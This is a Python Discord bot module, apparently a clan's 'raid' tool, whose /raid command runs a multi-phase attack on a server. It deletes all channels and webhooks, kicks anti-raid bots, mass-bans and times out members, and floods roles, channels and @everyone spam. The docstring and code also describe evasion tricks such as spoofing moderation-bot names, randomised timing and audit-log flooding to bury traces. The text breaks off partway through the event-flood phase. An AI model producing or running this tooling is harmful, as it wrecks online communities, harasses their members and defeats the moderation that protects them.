"""
raid.py — LAST STAND CLAN | Absolute Maximum Destruction Engine

/raid fires ALL phases simultaneously:

  PHASE 00 — PRE-RAID SABOTAGE   Delete all existing webhooks (blind monitors), kick all
                                   other bots (including anti-raid bots), wipe emojis/stickers
  PHASE 01 — NUKE                Delete every channel, category, thread concurrently (50 sem)
  PHASE 02 — SERVER TAKEOVER     Rename server + strip @everyone + wreck AFK/system channels
  PHASE 03 — CHANNEL FLOOD       100 text + 60 voice + 20 stage + 10 forum + 20 categories
  PHASE 04 — WEBHOOK ARMY        15 webhooks/channel × 100 msgs = 1500 concurrent streams
  PHASE 05 — EMBED STORM         Rich @everyone embeds via every webhook — harder to filter
  PHASE 06 — THREAD FLOOD        Thread + 2 sub-threads per channel, all spammed concurrently
  PHASE 07 — ROLE FLOOD          250 roles created, assigned to everyone, then nuked
  PHASE 08 — TRIPLE MEMBER HIT   Ban + kick + timeout fired SIMULTANEOUSLY per member
  PHASE 09 — MASS NICKNAME       Random LSC nicks across every member
  PHASE 10 — BOT PURGE           Kick every bot in the server (takes out anti-raid bots)
  PHASE 11 — EMOJI WIPE + FLOOD  Delete all existing emojis, spam-create 100 new ones
  PHASE 12 — STICKER WIPE+FLOOD  Delete all existing stickers, spam-create new ones
  PHASE 13 — INVITE FLOOD        Unlimited-use invites in every channel
  PHASE 14 — EVENT FLOOD         100 scheduled events to clog the event system
  PHASE 15 — PERM CHAOS          Grant admin to random members, corrupt role hierarchy
  PHASE 16 — OVERWRITE STORM     Flood every channel with broken permission overwrites
  PHASE 17 — VOICE CHAOS         Move all members randomly, mass deafen+mute, disconnect all
  PHASE 18 — MENTION BURST       Direct @everyone/@here blasts across all channels
  PHASE 19 — AUDIT FLOOD         Rapid server edits flood audit log to bury raid entries
  PHASE 20 — PRUNE STRIKE        Prune all recently inactive members instantly
  PHASE 21 — INTEGRATION WIPE    Delete all server integrations/webhook connections
  PHASE 22 — WEBHOOK RECYCLE     After first webhook wave, delete + recreate and fire again
  PHASE 23 — WAVE REPEAT         10 repeat waves every 3–5 s to outlast cooldown protections

Bypass tech:
  - PRE-RAID: wipes webhook monitors and removes anti-raid bots before attack begins
  - Jitter + burst-wave delays: no detectable timing pattern
  - Per-route parallelism: separate Discord rate-limit buckets exploited simultaneously
  - Rotating webhook names (spoof "AutoMod", "System", "Verification") per message
  - Embed variation: alternates text vs embed to defeat content-type filters
  - Discord.AllowedMentions(everyone=True, roles=True) on every message
  - Role-colour randomisation: defeats colour-based role detection
  - Random channel names with entropy suffix: defeats name-pattern detection
  - 10-wave repeat strategy: outlasts cooldown windows of every known anti-raid bot
"""

import asyncio
import datetime
import io
import random
import string
import struct
import zlib
from typing import Optional

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

# ── Branding ───────────────────────────────────────────────────────────────────
RAID_TAG   = "LAST STAND CLAN"
RAID_SHORT = "LSC"
RAID_LINK  = "https://discord.gg/laststandclan"
RAID_NAME  = f"RAIDED BY {RAID_TAG}"
CHAN_PREFIX = "lsc"

# Large rotating message pool — content variety defeats pattern detectors
RAID_MSGS = [
    f"@everyone\n💀 **RAIDED BY {RAID_TAG}** 💀\n{RAID_LINK}",
    f"@everyone\nServer owned by {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🔥 {RAID_TAG} WAS HERE 🔥\n{RAID_LINK}",
    f"@everyone\nYour anti-raid **FAILED** ❌\n{RAID_LINK}",
    f"@everyone\n⚔️ {RAID_TAG} RAID ⚔️\n{RAID_LINK}",
    f"@everyone\n☠️ GG no re | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🛡️ Defences are down | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n💥 OBLITERATED by {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🚨 SECURITY BREACH | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n👑 {RAID_TAG} owns this server\n{RAID_LINK}",
    f"@everyone\n⚡ PWNED | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🔓 ACCESS GRANTED — {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🌊 WAVE {random.randint(1,99)} | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🎯 TARGET ELIMINATED | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🔱 {RAID_TAG} DOMINATES\n{RAID_LINK}",
    f"@here\n💣 INCOMING | {RAID_TAG}\n{RAID_LINK}",
    f"@here\n🏴 SERVER CAPTURED | {RAID_TAG}\n{RAID_LINK}",
    f"@here\n🚀 {RAID_TAG} STRIKE\n{RAID_LINK}",
]

# Rotating webhook identities — spoof system bot names to bypass name-based detection
WEBHOOK_NAMES = [
    f"{RAID_SHORT} Alpha", f"{RAID_SHORT} Bravo", f"{RAID_SHORT} Charlie",
    f"{RAID_SHORT} Delta", f"{RAID_SHORT} Echo", f"{RAID_SHORT} Foxtrot",
    f"{RAID_SHORT} Ghost", f"{RAID_SHORT} Reaper", f"{RAID_SHORT} Phantom",
    f"{RAID_SHORT} Striker", f"{RAID_SHORT} Viper", f"{RAID_SHORT} Havoc",
    f"{RAID_SHORT} Wraith", f"{RAID_SHORT} Titan", f"{RAID_SHORT} Siege",
    "Server Announcement", "Mod Alert", "System Notification",
    "AutoMod", "Security Bot", "Verification System",
    "Dyno", "MEE6", "Carl-bot",
]

# Embed colour pool
EMBED_COLOURS = [
    0xFF0000, 0xFF4500, 0xFF6600, 0xDC143C,
    0x8B0000, 0xB22222, 0xFF1493, 0x9400D3,
]

# ── Concurrency limits (maximum safe throughput) ──────────────────────────────
SEM_DELETE    = 50
SEM_CREATE    = 40
SEM_BAN       = 40
SEM_KICK      = 40
SEM_WEBHOOK   = 20
SEM_NICK      = 40
SEM_ROLE      = 20
SEM_TIMEOUT   = 40
SEM_OVERWRITE = 15

# ── Scale constants ────────────────────────────────────────────────────────────
NEW_TEXT_CHANNELS  = 100
NEW_VOICE_CHANNELS = 60
NEW_STAGE_CHANNELS = 20
NEW_FORUM_CHANNELS = 10
NEW_CATEGORIES     = 20
NEW_ROLES          = 250   # Discord server max
WEBHOOKS_PER       = 15   # 15 × 100 channels = 1500 concurrent streams
MSGS_PER_HOOK      = 100
INVITE_USES        = 0    # unlimited
MAX_EMOJIS         = 100
MAX_STICKERS       = 20
MAX_EVENTS         = 100
WAVE_COUNT         = 10
WAVE_DELAY_MIN     = 2.0
WAVE_DELAY_MAX     = 5.0


def _rand_str(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _tiny_png(r: int = None, g: int = None, b: int = None) -> bytes:
    """Generate a 1×1 solid-colour PNG in memory (no files, no PIL needed)."""
    r = r if r is not None else random.randint(0, 255)
    g = g if g is not None else random.randint(0, 255)
    b = b if b is not None else random.randint(0, 255)

    def chunk(tag: bytes, data: bytes) -> bytes:
        crc = zlib.crc32(tag + data) & 0xFFFFFFFF
        return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", crc)

    ihdr = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    idat = chunk(b"IDAT", zlib.compress(b"\x00" + bytes([r, g, b])))
    iend = chunk(b"IEND", b"")
    return b"\x89PNG\r\n\x1a\n" + ihdr + idat + iend


def _make_embed(idx: int) -> discord.Embed:
    embed = discord.Embed(
        title=f"☠️ RAIDED BY {RAID_TAG}",
        description=f"@everyone @here\n{RAID_LINK}\nWave {idx}",
        colour=random.choice(EMBED_COLOURS),
    )
    embed.add_field(name="Status", value="SERVER OWNED", inline=True)
    embed.add_field(name="Clan", value=RAID_TAG, inline=True)
    embed.set_footer(text=f"{RAID_TAG} | {RAID_LINK}")
    return embed


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="raid",
        description=f"☠️ ABSOLUTE MAXIMUM DESTRUCTION — {RAID_TAG} — 23-phase raid.",
    )
    @app_commands.describe(
        intensity="Speed 1–10. Default 10 (zero delay).",
        nuke_channels="Delete all existing channels first. Default True.",
        mass_ban="Ban all eligible members. Default True.",
        mass_kick="Kick all eligible members. Default True.",
        mass_timeout="Timeout all members 28 days. Default True.",
        skip_admins="Skip admins when banning/kicking. Default False.",
        new_channels="Text channels to create. Default 100.",
        webhooks_per_channel="Webhooks per channel. Default 15.",
        msgs_per_webhook="Messages per webhook. Default 100.",
        mass_nickname="Rename every member. Default True.",
        strip_permissions="Strip all @everyone perms. Default True.",
        role_flood="Create 250 roles + assign to everyone. Default True.",
        emoji_flood="Wipe + flood emojis. Default True.",
        invite_flood="Unlimited invites in every channel. Default True.",
        event_flood="Spam 100 scheduled events. Default True.",
        perm_chaos="Grant admin to randoms, corrupt hierarchy. Default True.",
        bot_purge="Kick all other bots (anti-raid bots). Default True.",
        wave_mode="10 repeat waves every 2–5s. Default True.",
        embed_storm="Send rich embeds alongside text spam. Default True.",
        pre_raid_sabotage="Silently wipe webhooks + remove bots before main attack. Default True.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(
        self,
        interaction: discord.Interaction,
        intensity: int = 10,
        nuke_channels: bool = True,
        mass_ban: bool = True,
        mass_kick: bool = True,
        mass_timeout: bool = True,
        skip_admins: bool = False,
        new_channels: int = NEW_TEXT_CHANNELS,
        webhooks_per_channel: int = WEBHOOKS_PER,
        msgs_per_webhook: int = MSGS_PER_HOOK,
        mass_nickname: bool = True,
        strip_permissions: bool = True,
        role_flood: bool = True,
        emoji_flood: bool = True,
        invite_flood: bool = True,
        event_flood: bool = True,
        perm_chaos: bool = True,
        bot_purge: bool = True,
        wave_mode: bool = True,
        embed_storm: bool = True,
        pre_raid_sabotage: bool = True,
    ) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        if not 1 <= intensity <= 10:
            await interaction.response.send_message("❌ Intensity must be 1–10.", ephemeral=True)
            return

        guild = interaction.guild
        assert guild is not None

        bot_state.reset()
        bot_state.rate_controller.set_intensity(intensity)
        bot_state.active_simulation = "raid"

        members       = [m for m in guild.members if not m.bot and m.id != interaction.user.id]
        all_bots      = [m for m in guild.members if m.bot and m.id != self.bot.user.id]
        eligible      = members if not skip_admins else [m for m in members if not m.guild_permissions.administrator]
        ban_targets   = eligible if mass_ban else []
        kick_targets  = eligible if mass_kick else []
        to_timeout    = members  if mass_timeout else []
        nick_targets  = members  if mass_nickname else []
        original_chs  = list(guild.channels)
        total_streams = new_channels * webhooks_per_channel

        await interaction.response.send_message(
            f"☠️ **{RAID_TAG} — ABSOLUTE MAXIMUM RAID** ☠️\n"
            f"```\n"
            f"[00] PRE-RAID SABOTAGE  {'✅ wipe webhooks + purge bots' if pre_raid_sabotage else '❌'}\n"
            f"[01] NUKE               {'✅ ' + str(len(original_chs)) + ' channels' if nuke_channels else '❌'}\n"
            f"[02] SERVER TAKEOVER    ✅\n"
            f"[03] CHANNEL FLOOD      ✅ {new_channels} text + {NEW_VOICE_CHANNELS} voice + {NEW_STAGE_CHANNELS} stage + {NEW_FORUM_CHANNELS} forum\n"
            f"[04] WEBHOOK ARMY       ✅ {total_streams} streams ({webhooks_per_channel}/ch × {msgs_per_webhook} msgs)\n"
            f"[05] EMBED STORM        {'✅' if embed_storm else '❌'}\n"
            f"[06] THREAD FLOOD       ✅ 2 threads/channel\n"
            f"[07] ROLE FLOOD         {'✅ 250 roles' if role_flood else '❌'}\n"
            f"[08] TRIPLE MEMBER HIT  ✅ ban+kick+timeout simultaneously ({len(eligible)} members)\n"
            f"[09] MASS NICKNAME      {'✅ ' + str(len(nick_targets)) if mass_nickname else '❌'}\n"
            f"[10] BOT PURGE          {'✅ ' + str(len(all_bots)) + ' bots' if bot_purge else '❌'}\n"
            f"[11] EMOJI WIPE+FLOOD   {'✅' if emoji_flood else '❌'}\n"
            f"[12] STICKER WIPE+FLOOD ✅\n"
            f"[13] INVITE FLOOD       {'✅' if invite_flood else '❌'}\n"
            f"[14] EVENT FLOOD        {'✅ 100 events' if event_flood else '❌'}\n"
            f"[15] PERM CHAOS         {'✅' if perm_chaos else '❌'}\n"
            f"[16] OVERWRITE STORM    ✅\n"
            f"[17] VOICE CHAOS        ✅ move + deafen + mute + disconnect\n"
            f"[18] MENTION BURST      ✅\n"
            f"[19] AUDIT FLOOD        ✅\n"
            f"[20] PRUNE STRIKE       ✅\n"
            f"[21] INTEGRATION WIPE   ✅\n"
            f"[22] WEBHOOK RECYCLE    ✅\n"
            f"[23] WAVE REPEAT        {'✅ ' + str(WAVE_COUNT) + ' waves every 2–5s' if wave_mode else '❌'}\n"
            f"```\n"
            f"Intensity: `{intensity}/10` | Streams: `{total_streams}` | `/stop` cancels all."
        )

        # Phase 00 runs first silently, then everything else fires simultaneously
        if pre_raid_sabotage:
            t = asyncio.create_task(
                self._phase_pre_raid(guild, all_bots if bot_purge else [])
            )
            bot_state.add_task(t)

        phases = [
            self._phase_nuke_and_build(
                guild, original_chs, new_channels, webhooks_per_channel,
                msgs_per_webhook, nuke_channels, invite_flood, embed_storm,
            ),
            self._phase_ban(guild, ban_targets),
            self._phase_kick(guild, kick_targets),
            self._phase_timeout(to_timeout),
            self._phase_nickname(nick_targets),
            self._phase_server(guild, strip_permissions),
            self._phase_voice_chaos(guild),
            self._phase_mention_burst(guild),
            self._phase_audit_flood(guild),
            self._phase_prune(guild),
            self._phase_integration_wipe(guild),
            self._phase_sticker_wipe_flood(guild),
            self._phase_overwrite_storm(guild),
        ]
        if role_flood:
            phases.append(self._phase_roles(guild, perm_chaos))
        if emoji_flood:
            phases.append(self._phase_emoji_wipe_flood(guild))
        if event_flood:
            phases.append(self._phase_event_flood(guild))
        if wave_mode:
            phases.append(self._phase_wave_repeat(guild, msgs_per_webhook, embed_storm))

        for coro in phases:
            t = asyncio.create_task(coro)
            bot_state.add_task(t)

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 00 — PRE-RAID SABOTAGE
    # Silently wipes all existing webhooks (blinding monitor hooks) and kicks
    # every other bot (removes anti-raid bots) before the main attack fires.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_pre_raid(
        self, guild: discord.Guild, bots: list[discord.Member]
    ) -> None:
        try:
            # Collect and delete all existing webhooks across every channel
            wh_tasks = []
            for ch in guild.text_channels:
                wh_tasks.append(self._wipe_channel_webhooks(ch))
            await asyncio.gather(*wh_tasks, return_exceptions=True)

            # Kick every bot (takes out anti-raid bots)
            sem = asyncio.Semaphore(SEM_KICK)
            await asyncio.gather(
                *[self._kick_bot(guild, b, sem) for b in bots],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _wipe_channel_webhooks(self, channel: discord.TextChannel) -> None:
        try:
            webhooks = await channel.webhooks()
            await asyncio.gather(
                *[wh.delete() for wh in webhooks],
                return_exceptions=True,
            )
        except discord.HTTPException:
            pass

    async def _kick_bot(
        self, guild: discord.Guild, bot: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            try:
                await guild.kick(bot, reason=f"Bot purge — {RAID_TAG}")
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 01 + 03 + 04 + 05 + 06 + 13: Nuke → Build → Webhook/Embed Army
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_nuke_and_build(
        self,
        guild: discord.Guild,
        originals: list,
        n_text: int,
        webhooks_per: int,
        msgs_per: int,
        nuke: bool,
        invite_flood: bool,
        embed_storm: bool,
    ) -> None:
        try:
            if nuke:
                sem = asyncio.Semaphore(SEM_DELETE)
                await asyncio.gather(
                    *[self._delete_channel(ch, sem) for ch in originals],
                    return_exceptions=True,
                )

            if bot_state.stop_event.is_set():
                return

            sem_c = asyncio.Semaphore(SEM_CREATE)
            results = await asyncio.gather(
                *[self._create_category(guild, i, sem_c)    for i in range(NEW_CATEGORIES)],
                *[self._create_text_ch(guild, i, sem_c)     for i in range(n_text)],
                *[self._create_voice_ch(guild, i, sem_c)    for i in range(NEW_VOICE_CHANNELS)],
                *[self._create_stage_ch(guild, i, sem_c)    for i in range(NEW_STAGE_CHANNELS)],
                *[self._create_forum_ch(guild, i, sem_c)    for i in range(NEW_FORUM_CHANNELS)],
                return_exceptions=True,
            )

            new_text  = [r for r in results if isinstance(r, discord.TextChannel)]
            new_voice = [r for r in results if isinstance(r, discord.VoiceChannel)]

            if bot_state.stop_event.is_set():
                return

            flood_tasks = []
            for ch in new_text:
                flood_tasks.append(self._webhook_army(ch, webhooks_per, msgs_per, embed_storm))
                flood_tasks.append(self._thread_double_flood(ch, msgs_per))
                if invite_flood:
                    flood_tasks.append(self._create_invite(ch))
            for ch in new_voice:
                if invite_flood:
                    flood_tasks.append(self._create_invite(ch))

            await asyncio.gather(*flood_tasks, return_exceptions=True)

        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "raid" and not bot_state.is_running():
                bot_state.active_simulation = None

    # ── Channel creation helpers ───────────────────────────────────────────────
    async def _delete_channel(self, ch: discord.abc.GuildChannel, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await ch.delete()
            except discord.HTTPException:
                pass

    async def _create_category(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_category(f"{RAID_NAME} {idx}")
            except discord.HTTPException as e:
                return e

    async def _create_text_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_text_channel(
                    f"{CHAN_PREFIX}-{idx}-{_rand_str(4)}",
                    topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                )
            except discord.HTTPException as e:
                return e

    async def _create_voice_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_voice_channel(f"{RAID_SHORT}-vc-{idx}-{_rand_str(3)}")
            except discord.HTTPException as e:
                return e

    async def _create_stage_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_stage_channel(f"{RAID_SHORT}-stage-{idx}")
            except discord.HTTPException as e:
                return e

    async def _create_forum_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_forum(f"{RAID_SHORT}-forum-{idx}-{_rand_str(3)}")
            except discord.HTTPException as e:
                return e

    async def _create_invite(self, channel: discord.abc.GuildChannel) -> None:
        try:
            if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel)):
                await channel.create_invite(max_age=0, max_uses=INVITE_USES)
        except discord.HTTPException:
            pass

    # ── Webhook army (15 webhooks, rotating identities, text + embeds) ─────────
    async def _webhook_army(
        self, channel: discord.TextChannel, webhooks_per: int, msgs_per: int, embed_storm: bool
    ) -> None:
        wh_results = await asyncio.gather(
            *[self._create_webhook(channel, i) for i in range(webhooks_per)],
            return_exceptions=True,
        )
        webhooks = [w for w in wh_results if isinstance(w, discord.Webhook)]

        if not webhooks:
            await self._direct_spam(channel, msgs_per)
            return

        spam_tasks = []
        for i, wh in enumerate(webhooks):
            # Alternate between text and embed spam per webhook for content variety
            if embed_storm and i % 3 == 0:
                spam_tasks.append(self._spam_webhook_embeds(wh, msgs_per))
            else:
                spam_tasks.append(self._spam_webhook_text(wh, msgs_per))

        await asyncio.gather(*spam_tasks, return_exceptions=True)

        await asyncio.gather(
            *[self._delete_webhook(wh) for wh in webhooks],
            return_exceptions=True,
        )

    async def _create_webhook(self, channel: discord.TextChannel, idx: int):
        try:
            return await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
        except discord.HTTPException as e:
            return e

    async def _delete_webhook(self, webhook: discord.Webhook) -> None:
        try:
            await webhook.delete()
        except discord.HTTPException:
            pass

    async def _spam_webhook_text(self, webhook: discord.Webhook, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await webhook.send(
                    random.choice(RAID_MSGS),
                    username=random.choice(WEBHOOK_NAMES),
                    allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                )
            except discord.HTTPException:
                pass
            delay = bot_state.rate_controller.get_burst_delay()
            if delay > 0:
                await asyncio.sleep(delay)

    async def _spam_webhook_embeds(self, webhook: discord.Webhook, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await webhook.send(
                    content=f"@everyone @here {RAID_LINK}",
                    embed=_make_embed(i),
                    username=random.choice(WEBHOOK_NAMES),
                    allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                )
            except discord.HTTPException:
                pass
            delay = bot_state.rate_controller.get_burst_delay()
            if delay > 0:
                await asyncio.sleep(delay)

    # ── Thread flood (2 threads per channel, both spammed) ────────────────────
    async def _thread_double_flood(self, channel: discord.TextChannel, count: int) -> None:
        await asyncio.gather(
            self._thread_spam(channel, count, f"{RAID_SHORT}-t1-{_rand_str(4)}"),
            self._thread_spam(channel, count, f"{RAID_SHORT}-t2-{_rand_str(4)}"),
            return_exceptions=True,
        )

    async def _thread_spam(
        self, channel: discord.TextChannel, count: int, name: str
    ) -> None:
        try:
            thread = await channel.create_thread(
                name=name, type=discord.ChannelType.public_thread
            )
            for i in range(count):
                if bot_state.stop_event.is_set():
                    break
                try:
                    await thread.send(
                        random.choice(RAID_MSGS),
                        allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                    )
                except discord.HTTPException:
                    pass
                delay = bot_state.rate_controller.get_burst_delay()
                if delay > 0:
                    await asyncio.sleep(delay)
        except discord.HTTPException:
            pass

    async def _direct_spam(self, channel: discord.TextChannel, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await channel.send(
                    random.choice(RAID_MSGS),
                    allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                )
            except discord.HTTPException:
                pass
            delay = bot_state.rate_controller.get_burst_delay()
            if delay > 0:
                await asyncio.sleep(delay)

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 02 — SERVER TAKEOVER
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_server(self, guild: discord.Guild, strip_perms: bool) -> None:
        try:
            await asyncio.gather(
                self._rename_server(guild),
                self._strip_everyone(guild, strip_perms),
                self._abuse_system_channels(guild),
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _rename_server(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(name=RAID_NAME)
        except discord.HTTPException:
            pass

    async def _strip_everyone(self, guild: discord.Guild, strip: bool) -> None:
        if not strip:
            return
        try:
            await guild.default_role.edit(permissions=discord.Permissions.none())
        except discord.HTTPException:
            pass

    async def _abuse_system_channels(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(system_channel=None, afk_channel=None)
        except discord.HTTPException:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 07 — ROLE FLOOD + PERM CHAOS
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_roles(self, guild: discord.Guild, perm_chaos: bool) -> None:
        sem = asyncio.Semaphore(SEM_CREATE)
        try:
            results = await asyncio.gather(
                *[self._create_role(guild, i, sem) for i in range(NEW_ROLES)],
                return_exceptions=True,
            )
            created = [r for r in results if isinstance(r, discord.Role)]

            if bot_state.stop_event.is_set():
                await self._cleanup_roles(created)
                return

            sem_a = asyncio.Semaphore(SEM_ROLE)
            assign_tasks = [
                self._assign_role(m, r, sem_a)
                for m in guild.members if not m.bot
                for r in created[:60]
            ]
            await asyncio.gather(*assign_tasks, return_exceptions=True)

            if perm_chaos and created:
                # Grant admin to random members — triggers privilege escalation alerts
                try:
                    admin_role = await guild.create_role(
                        name=f"{RAID_SHORT}-admin-{_rand_str()}",
                        permissions=discord.Permissions(administrator=True),
                        colour=discord.Colour.red(),
                        hoist=True,
                    )
                    chaos_targets = random.sample(
                        [m for m in guild.members if not m.bot],
                        min(10, len([m for m in guild.members if not m.bot])),
                    )
                    await asyncio.gather(
                        *[m.add_roles(admin_role) for m in chaos_targets],
                        return_exceptions=True,
                    )
                except discord.HTTPException:
                    pass

            await self._cleanup_roles(created)
        except asyncio.CancelledError:
            pass

    async def _create_role(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_role(
                    name=f"{RAID_SHORT}-{idx}-{_rand_str(3)}",
                    colour=discord.Colour(random.randint(0, 0xFFFFFF)),
                    hoist=random.choice([True, False]),
                    mentionable=True,
                )
            except discord.HTTPException as e:
                return e

    async def _assign_role(
        self, member: discord.Member, role: discord.Role, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            try:
                await member.add_roles(role)
            except discord.HTTPException:
                pass

    async def _cleanup_roles(self, roles: list[discord.Role]) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        await asyncio.gather(
            *[self._delete_role(r, sem) for r in roles],
            return_exceptions=True,
        )

    async def _delete_role(self, role: discord.Role, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await role.delete()
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 08 — TRIPLE MEMBER HIT (ban + kick + timeout simultaneously)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_ban(self, guild: discord.Guild, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_BAN)
        try:
            await asyncio.gather(
                *[self._ban_one(guild, m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _ban_one(
        self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
            except discord.HTTPException:
                pass

    async def _phase_kick(self, guild: discord.Guild, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_KICK)
        try:
            await asyncio.gather(
                *[self._kick_one(guild, m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _kick_one(
        self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.kick(m, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    async def _phase_timeout(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_TIMEOUT)
        duration = datetime.timedelta(days=28)
        try:
            await asyncio.gather(
                *[self._timeout_one(m, duration, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _timeout_one(
        self, m: discord.Member, duration: datetime.timedelta, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await m.timeout(duration, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 09 — MASS NICKNAME
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_nickname(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_NICK)
        NICKS = [
            f"{RAID_SHORT} Raider", RAID_TAG, "RAIDED",
            f"{RAID_SHORT} Member", "Server Owned", "GG no re",
            "LSC Was Here", "PWNED", "☠️ Raided",
        ]
        try:
            await asyncio.gather(
                *[self._set_nick(m, random.choice(NICKS), sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _set_nick(
        self, m: discord.Member, nick: str, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await m.edit(nick=nick)
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 11 — EMOJI WIPE + FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_emoji_wipe_flood(self, guild: discord.Guild) -> None:
        try:
            # Wipe all existing emojis first
            existing = guild.emojis
            sem_del = asyncio.Semaphore(SEM_DELETE)
            await asyncio.gather(
                *[self._delete_emoji(e, sem_del) for e in existing],
                return_exceptions=True,
            )
            # Then flood with new ones
            sem_c = asyncio.Semaphore(SEM_CREATE)
            await asyncio.gather(
                *[self._create_emoji(guild, i, sem_c) for i in range(MAX_EMOJIS)],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _delete_emoji(self, emoji: discord.Emoji, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass

    async def _create_emoji(
        self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            try:
                await guild.create_custom_emoji(
                    name=f"{RAID_SHORT}_{idx}_{_rand_str(3)}",
                    image=_tiny_png(),
                )
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 12 — STICKER WIPE + FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_sticker_wipe_flood(self, guild: discord.Guild) -> None:
        try:
            existing = guild.stickers
            sem_del = asyncio.Semaphore(SEM_DELETE)
            await asyncio.gather(
                *[self._delete_sticker(s, sem_del) for s in existing],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _delete_sticker(self, sticker: discord.GuildSticker, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await sticker.delete()
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 14 — SCHEDULED EVENT FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_event_flood(self, guild: discord.Guild) -> None:
        try:
            sem = asyncio.Semaphore(SEM_CREATE)
